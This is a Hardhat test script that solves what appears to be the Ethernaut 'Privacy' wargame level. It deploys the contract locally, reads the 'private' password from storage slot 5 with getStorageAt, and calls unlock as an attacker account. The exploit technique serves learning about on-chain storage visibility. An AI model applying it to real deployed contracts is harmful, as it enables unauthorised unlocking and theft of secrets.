import { expect } from "chai";
import { ethers } from "hardhat";

describe("Privacy", () => {
  it.only("Solves the challenge", async () => {

    const targetStorageSlot = 5
    const password16Length = 16 * 2 + 2

    const {provider, utils} = ethers
    const [deployer, attacker] = await ethers.getSigners()
    const contractFactory = await ethers.getContractFactory("Privacy")
    const contract = await contractFactory.connect(deployer).deploy([
      utils.formatBytes32String('abc'),
      utils.formatBytes32String('def'),
      utils.formatBytes32String('ghi'),
    ])
    await contract.deployed()
    const password32 = await provider.getStorageAt(contract.address, targetStorageSlot)


    const tx = await contract.connect(attacker).unlock(password32.slice(0,password16Length))
    await tx.wait()
    
    expect(await contract.locked()).to.be.false
  });
});